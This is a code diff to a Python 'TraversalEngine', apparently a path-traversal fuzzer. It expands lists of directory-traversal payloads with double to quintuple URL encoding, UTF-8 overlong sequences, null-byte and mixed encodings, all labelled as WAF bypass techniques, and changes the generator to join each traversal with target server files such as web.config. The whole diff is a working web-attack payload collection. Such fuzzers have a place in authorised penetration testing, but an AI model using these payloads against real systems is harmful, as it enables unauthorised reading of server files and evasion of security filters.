@@ -118,58 +118,218 @@ class TraversalEngine:
         "web.config"
     ]
 
-    # Dots (..) representations for fuzzing
+    # Dots (..) representations for fuzzing with comprehensive WAF bypass encoding
     DOTS = [
+        # Basic representations
         "..",
-        ".%00.",
-        "..%00",
-        "..%01", 
+        
+        # Null byte variations
+        ".%00.", "..%00", "..%01", 
+        
+        # Wildcard patterns  
         ".?", "??", "?.",
-        "%5C..",
-        ".%2e", "%2e.",
-        ".../.",
-        "..../",
-        "%2e%2e", "%%c0%6e%c0%6e",
-        "0x2e0x2e", "%c0.%c0.",
+        
+        # Basic encoding
+        "%5C..", ".%2e", "%2e.",
+        
+        # Path manipulation
+        ".../.", "..../",
+        
+        # Single URL encoding
+        "%2e%2e",
+        
+        # Double URL encoding (critical for WAF bypass)
         "%252e%252e",
+        
+        # Triple URL encoding
+        "%25252e%25252e",
+        
+        # Quadruple URL encoding
+        "%2525252e%2525252e",
+        
+        # Quintuple URL encoding  
+        "%252525252e%252525252e",
+        
+        # Alternative encoding techniques
+        "%%c0%6e%c0%6e", "0x2e0x2e", "%c0.%c0.",
+        
+        # UTF-8 overlong encoding variations
         "%c0%2e%c0%2e", "%c0%ae%c0%ae",
         "%c0%5e%c0%5e", "%c0%ee%c0%ee",
-        "%c0%fe%c0%fe", "%uff0e%uff0e",
+        "%c0%fe%c0%fe", 
+        
+        # Unicode fullwidth variations
+        "%uff0e%uff0e",
+        
+        # Double encoded alternatives
         "%%32%%65%%32%%65",
+        
+        # Invalid UTF-8 sequences
         "%e0%80%ae%e0%80%ae",
+        
+        # Mixed encoding with URL encoding layers
         "%25c0%25ae%25c0%25ae",
+        
+        # 4-byte UTF-8 overlong
         "%f0%80%80%ae%f0%80%80%ae",
+        
+        # 5-byte UTF-8 overlong
         "%f8%80%80%80%ae%f8%80%80%80%ae",
-        "%fc%80%80%80%80%ae%fc%80%80%80%80%ae"
+        
+        # 6-byte UTF-8 overlong
+        "%fc%80%80%80%80%ae%fc%80%80%80%80%ae",
+        
+        # Mixed multiple encoding combinations
+        "%252e%2e",          # Double + single encoding mix
+        "%25252e%252e",      # Triple + double encoding mix
+        "%2e%252e",          # Single + double encoding mix
+        
+        # Case variation encodings
+        "%2E%2E",            # Uppercase single encoding
+        "%252E%252E",        # Uppercase double encoding
+        "%25252E%25252E",    # Uppercase triple encoding
+        
+        # Hybrid encoding techniques
+        "%c0%ae%252e",       # UTF-8 overlong + double URL
+        "%e0%80%ae%25252e",  # Invalid UTF-8 + triple URL
+        "%252e%c0%ae",       # Double URL + UTF-8 overlong
+        "%25252e%e0%80%ae",  # Triple URL + invalid UTF-8
     ]
 
-    # Slashes (/ and \\) representations for fuzzing
+    # Slashes (/ and \\) representations for fuzzing with comprehensive WAF bypass encoding
     SLASHES = [
+        # Basic representations
         "/", "\\\\",
+        
+        # Single URL encoding
         "%2f", "%5c",
+        
+        # Hexadecimal representations
         "0x2f", "0x5c", 
+        
+        # Double URL encoding (critical for WAF bypass)
         "%252f", "%255c",
+        "%252f/", "%255c\\",          # Double encoding with literal separators
+        
+        # Triple URL encoding (bypasses multiple decode layers)
+        "%25252f", "%25255c",
+        "%25252f/", "%25255c\\",      # Triple encoding with literal separators
+        
+        # Quadruple URL encoding (for deep decode protection)
+        "%2525252f", "%2525255c",
+        "%2525252f/", "%2525255c\\",  # Quadruple encoding with literal separators
+        
+        # Quintuple URL encoding (maximum protection bypass)
+        "%252525252f", "%252525255c",
+        "%252525252f/", "%252525255c\\", # Quintuple encoding with literal separators
+        
+        # UTF-8 overlong encoding variations
         "%c0%2f", "%c0%af", "%c0%5c", "%c1%9c", "%c1%pc",
         "%c0%9v", "%c0%qf", "%c1%8s", "%c1%1c", "%c1%af",
+        
+        # Unicode and special character encodings
         "%bg%qf", "%u2215", "%u2216", "%uEFC8", "%uF025",
+        
+        # Mixed double encoding techniques  
         "%%32%%66", "%%35%%63",
+        
+        # Invalid UTF-8 sequences
         "%e0%80%af",
+        
+        # Mixed encoding with URL encoding layers
         "%25c1%259c", "%25c0%25af", 
+        
+        # 4-byte UTF-8 overlong encoding
         "%f0%80%80%af",
-        "%f8%80%80%80%af"
+        
+        # 5-byte UTF-8 overlong encoding
+        "%f8%80%80%80%af",
+        
+        # Mixed multiple encoding combinations (WAF confusion techniques)
+        "%252f%2f",         # Double + single encoding mix
+        "%25252f%252f",     # Triple + double encoding mix
+        "%2f%252f",         # Single + double encoding mix
+        "%5c%255c",         # Single + double backslash mix
+        "%255c%25255c",     # Double + triple backslash mix
+        
+        # Case variation encodings
+        "%2F", "%5C",       # Uppercase single encoding
+        "%252F", "%255C",   # Uppercase double encoding
+        "%25252F", "%25255C", # Uppercase triple encoding
+        
+        # Alternative slash representations with multiple encoding
+        "%252e%252e%252f",  # Double encoded '../'
+        "%25252e%25252e%25252f", # Triple encoded '../'
+        
+        # Hybrid encoding techniques
+        "%c0%af%252f",      # UTF-8 overlong + double URL
+        "%e0%80%af%25252f", # Invalid UTF-8 + triple URL
+        "%252f%c0%af",      # Double URL + UTF-8 overlong
+        "%25252f%e0%80%af", # Triple URL + invalid UTF-8
     ]
 
     # Special patterns that won't be combined in the main engine to reduce payload count
+    # These include specific WAF bypass combinations and edge cases
     SPECIAL_PATTERNS = [
+        # Basic traversal variations
         "..//", "..///", "..\\\\\\\\", "..\\\\\\\\\\\\", "../\\\\", "..\\\\/",
         "../\\\\/", "..\\\\/\\\\", "\\\\../", "/..\\\\", ".../", "...\\\\",
         "./../", ".\\\\..\\\\", ".//..///", ".\\\\\\\\..\\\\\\\\", "......///",
-        "%2e%c0%ae%5c", "%2e%c0%ae%2f"
+        
+        # Mixed encoding special cases
+        "%2e%c0%ae%5c", "%2e%c0%ae%2f",
+        
+        # Multiple URL encoding special patterns for WAF bypass
+        "..%252f",                  # Double encoded single traversal
+        "..%25252f",                # Triple encoded single traversal
+        "..%2525252f",              # Quadruple encoded single traversal
+        "..%252525252f",            # Quintuple encoded single traversal
+        
+        # Mixed encoding combinations
+        "..%2f%252f",               # Single + double encoding
+        "..%252f%25252f",           # Double + triple encoding
+        "..%25252f%2525252f",       # Triple + quadruple encoding
+        "..%2525252f%252525252f",   # Quadruple + quintuple encoding
+        
+        # Case variation mixed patterns
+        "..%2F%252f",               # Mixed case single + double
+        "..%252F%25252f",           # Mixed case double + triple
+        "..%25252F%2525252f",       # Mixed case triple + quadruple
+        
+        # Hybrid UTF-8 + multiple URL encoding
+        "..%c0%af%252f",            # UTF-8 overlong + double URL
+        "..%c0%af%25252f",          # UTF-8 overlong + triple URL
+        "..%e0%80%af%252f",         # Invalid UTF-8 + double URL
+        "..%e0%80%af%25252f",       # Invalid UTF-8 + triple URL
+        
+        # Null byte with multiple encoding levels
+        "..%2500%252f",             # URL encoded null + double encoded slash
+        "..%252500%25252f",         # Double encoded null + triple encoded slash
+        "..%2525252500%2525252f",   # Quadruple encoded null + quintuple encoded slash
+        
+        # Space injection with multiple encoding
+        "..%20%252f",               # URL encoded space + double encoded slash
+        "..%2520%25252f",           # Double encoded space + triple encoded slash
+        "..%252520%2525252f",       # Triple encoded space + quadruple encoded slash
+        
+        # Complex encoding chains (maximum confusion)
+        "..%252e%25252e%2525252f",  # Triple encoded '../'
+        "..%2525252e%252525252e%252525252f", # Quintuple encoded '../'
+        
+        # Alternative representation with multiple encoding
+        "..%253f%252f",             # Double encoded '?' + double encoded '/'
+        "..%25253b%25252f",         # Triple encoded ';' + triple encoded '/'
+        "..%2525233%2525252f",      # Complex encoded '#' + quintuple encoded '/'
     ]
 
     # Non-recursive bypass patterns - designed to bypass filters that remove '../' only once
     # These patterns exploit filters that don't recursively clean up directory traversal sequences
     NON_RECURSIVE_BYPASS_PATTERNS = [
+        # Critical literal separator patterns for comprehensive WAF bypass
+        "..%252f..%252f..%252f",     # Triple double-encoded - CRITICAL PATTERN
+        "..%25252f..%25252f..%25252f", # Triple triple-encoded
+        "..%252f..%252f",            # Double double-encoded
+        
         # Core 4-dot double-slash patterns (main bypass technique)
         "....//",                   # After '../' removal becomes '../'
         ".....///",                 # 5-dot triple-slash variation
@@ -184,34 +344,92 @@ class TraversalEngine:
         "....//..\\\\",             # Mixed forward/backward slash
         "..\\\\..//",               # Mixed backward/forward slash
         
-        # URL encoded variations
+        # Single URL encoded variations
         "....%2f%2f",               # URL encoded double slash
         "....%5c%5c",               # URL encoded double backslash
+        
+        # Double URL encoded variations (critical for WAF bypass)
         "....%252f%252f",           # Double URL encoded slash
+        "....%252f%252f/",          # Double URL encoded slash with literal separator
         "....%255c%255c",           # Double URL encoded backslash
+        "....%255c%255c\\",         # Double URL encoded backslash with literal separator
+        
+        # Triple URL encoded variations
+        "....%25252f%25252f",       # Triple URL encoded slash
+        "....%25252f%25252f/",      # Triple URL encoded slash with literal separator
+        "....%25255c%25255c",       # Triple URL encoded backslash
+        "....%25255c%25255c\\",     # Triple URL encoded backslash with literal separator
+        
+        # Quadruple URL encoded variations
+        "....%2525252f%2525252f",   # Quadruple URL encoded slash
+        "....%2525252f%2525252f/",  # Quadruple URL encoded slash with literal separator
+        "....%2525255c%2525255c",   # Quadruple URL encoded backslash
+        "....%2525255c%2525255c\\", # Quadruple URL encoded backslash with literal separator
+        
+        # Quintuple URL encoded variations
+        "....%252525252f%252525252f", # Quintuple URL encoded slash
+        "....%252525252f%252525252f/", # Quintuple URL encoded slash with literal separator
+        "....%252525255c%252525255c", # Quintuple URL encoded backslash
+        "....%252525255c%252525255c\\", # Quintuple URL encoded backslash with literal separator
+        
+        # Mixed encoding level patterns (confusion techniques)
+        "....%2f%252f",             # Single + double encoding mix
+        "....%252f%25252f",         # Double + triple encoding mix
+        "....%25252f%2525252f",     # Triple + quadruple encoding mix
+        "....%5c%255c",             # Single + double backslash mix
+        "....%255c%25255c",         # Double + triple backslash mix
         
         # UTF-8 overlong encoding bypass
         "....%c0%af%c0%af",         # Overlong UTF-8 slash
         "....%c0%5c%c0%5c",         # Overlong UTF-8 backslash
         "....%e0%80%af%e0%80%af",   # Invalid UTF-8 slash sequence
         
-        # Null byte injection patterns
+        # Hybrid UTF-8 + URL encoding combinations
+        "....%c0%af%252f",          # UTF-8 overlong + double URL
+        "....%252f%c0%af",          # Double URL + UTF-8 overlong
+        "....%e0%80%af%25252f",     # Invalid UTF-8 + triple URL
+        "....%25252f%e0%80%af",     # Triple URL + invalid UTF-8
+        
+        # Null byte injection patterns with multiple encoding
         "....%00//",                # Null byte + forward slash
         "....%00\\\\",              # Null byte + backslash
         "..%00..//",                # Embedded null byte
+        "....%2500%252f%252f",      # URL encoded null + double encoded slash
+        "....%252500%25252f%25252f", # Double encoded null + triple encoded slash
         
-        # Space injection patterns
+        # Space injection patterns with encoding variations
         ".... //",                  # Space before slash
         "..../ /",                  # Space within slash sequence
         ".... \\\\",                # Space before backslash
+        "....%20%252f%252f",        # URL encoded space + double encoded slash
+        "....%2520%25252f%25252f",  # Double encoded space + triple encoded slash
         
-        # Alternative representation patterns
+        # Alternative representation patterns with encoding
         "....?/",                   # Question mark separator
         "....??//",                 # Double question mark
         "....;//",                  # Semicolon separator
         "....;;\\\\",               # Double semicolon with backslash
         "....#/",                   # Hash separator
         "....##//",                 # Double hash
+        
+        # Case variation bypass patterns
+        "....%2F%2F",               # Uppercase single encoding
+        "....%252F%252F",           # Uppercase double encoding
+        "....%25252F%25252F",       # Uppercase triple encoding
+        "....%5C%5C",               # Uppercase backslash single
+        "....%255C%255C",           # Uppercase backslash double
+        "....%25255C%25255C",       # Uppercase backslash triple
+        
+        # Double-encoded dots with multiple slash encoding
+        "..%252e%252e%252f%252f",   # Double encoded '..//'
+        "..%25252e%25252e%25252f%25252f", # Triple encoded '..//'
+        "..%2525252e%2525252e%2525252f%2525252f", # Quadruple encoded '..//'
+        
+        # Complex hybrid patterns for maximum bypass coverage
+        "....%252f%2f%252f",        # Mixed double and single encoding
+        "....%25252f%252f%25252f",  # Mixed triple and double encoding
+        "....%c0%af%252f%c0%af",    # UTF-8 + double URL interleaved
+        "....%e0%80%af%25252f%e0%80%af", # Invalid UTF-8 + triple URL interleaved
     ]
 
     def __init__(self, quiet: bool = False):
@@ -289,15 +507,23 @@ class TraversalEngine:
         
         for traversal in all_traversals:
             for target_file in target_files:
-                # Adapt slashes based on traversal pattern
-                adapted_file = self._adapt_file_slashes(target_file, traversal)
-                payload = traversal + adapted_file
+                # Generate both original and adapted file versions for comprehensive coverage
+                file_variants = [target_file]
                 
-                # Add extension if specified
-                if extension:
-                    payload += extension
+                # Adapt slashes based on traversal pattern for additional variant
+                adapted_file = self._adapt_file_slashes(target_file, traversal)
+                if adapted_file != target_file:
+                    file_variants.append(adapted_file)
+                
+                # Create payloads for all file variants
+                for file_variant in file_variants:
+                    payload = traversal + file_variant
                     
-                final_traversals.append(payload)
+                    # Add extension if specified
+                    if extension:
+                        payload += extension
+                        
+                    final_traversals.append(payload)
 
         # Add direct absolute path injection patterns
         if include_absolute and not bisection_depth:  # Skip absolute paths in bisection mode
@@ -399,7 +625,7 @@ class TraversalEngine:
                     traversals.append(pattern)
         
         # Add systematic NON_RECURSIVE_BYPASS_PATTERNS with controlled repetition
-        for base_pattern in self.NON_RECURSIVE_BYPASS_PATTERNS[:15]:  # Limit base patterns
+        for base_pattern in self.NON_RECURSIVE_BYPASS_PATTERNS[:30]:  # Increased limit to include literal separator patterns
             # Create multi-level combinations
             if max_depth >= 3:
                 three_level = f"{base_pattern}{base_pattern}{base_pattern[2:]}"  # Overlap for realism
@@ -455,13 +681,20 @@ class TraversalEngine:
         adapted_file = target_file
 
         # Check if pattern contains specific encodings and adapt accordingly
-        if "%2f" in traversal_pattern.lower():
+        # Handle multiple encoding levels: %2f, %252f, %25252f, %2525252f, %252525252f
+        pattern_lower = traversal_pattern.lower()
+        
+        if any(x in pattern_lower for x in ["%2f", "%252f", "%25252f", "%2525252f", "%252525252f"]):
+            # Pattern contains URL-encoded forward slashes, encode target file slashes
             adapted_file = adapted_file.replace("/", "%2f").replace("\\\\", "%5c")
-        elif "%5c" in traversal_pattern.lower():
+        elif any(x in pattern_lower for x in ["%5c", "%255c", "%25255c", "%2525255c", "%252525255c"]):
+            # Pattern contains URL-encoded backslashes, encode target file slashes  
             adapted_file = adapted_file.replace("/", "%2f").replace("\\\\", "%5c")
         elif "\\\\" in traversal_pattern:
+            # Pattern contains literal backslashes, use backslashes in target file
             adapted_file = adapted_file.replace("/", "\\\\")
         elif "/" in traversal_pattern:
+            # Pattern contains literal forward slashes, ensure forward slashes in target file
             adapted_file = adapted_file.replace("\\\\", "/")
 
         return adapted_file
